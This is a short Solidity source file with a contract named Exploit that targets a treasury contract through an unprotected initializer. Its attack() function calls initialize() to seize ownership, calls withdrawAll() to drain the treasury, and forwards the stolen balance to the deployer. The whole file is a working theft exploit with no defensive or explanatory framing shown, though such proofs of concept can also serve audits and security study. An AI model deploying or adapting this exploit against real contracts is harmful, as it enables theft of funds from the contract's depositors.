// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITreasury {
    function initialize(address _owner) external;
    function withdrawAll(address payable to) external;
}

contract Exploit {
    address public target;
    address public owner;

    constructor(address _target) payable {
        target = _target;
        owner = msg.sender;
    }

    function attack() external {
        ITreasury(target).initialize(address(this));
        ITreasury(target).withdrawAll(payable(address(this)));
        (bool ok, ) = payable(owner).call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    receive() external payable {}
}